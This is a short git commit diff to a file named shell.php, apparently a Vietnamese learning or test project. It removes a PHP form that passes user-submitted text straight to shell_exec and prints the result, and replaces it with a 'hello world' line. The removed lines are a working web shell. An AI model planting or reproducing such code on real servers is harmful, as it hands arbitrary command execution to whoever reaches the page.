3db4b890ff24d0add97daa0015b1b8606af835b3
lelong1210 <72912942+lelong1210@users.noreply.github.com>
2023-05-20 20:53:36 +0700

    Update shell.php

--- shell.php
+++ shell.php
@@ -4,18 +4,8 @@
     <title>Form th?c thi shell command</title>
 </head>
 <body>
-    <form method="POST" action="<?php echo $_SERVER['PHP_SELF']; ?>">
-        <label for="command">Enter Your Shell:</label>
-        <input type="text" name="command" id="command">
-        <input type="submit" value="Run">
-    </form>
-
     <?php
-    if ($_SERVER["REQUEST_METHOD"] == "POST") {
-        $command = $_POST["command"];
-        $output = shell_exec($command);
-        echo "<pre>$output</pre>";
-    }
+        echo "hello world";
     ?>
 </body>
 </html>
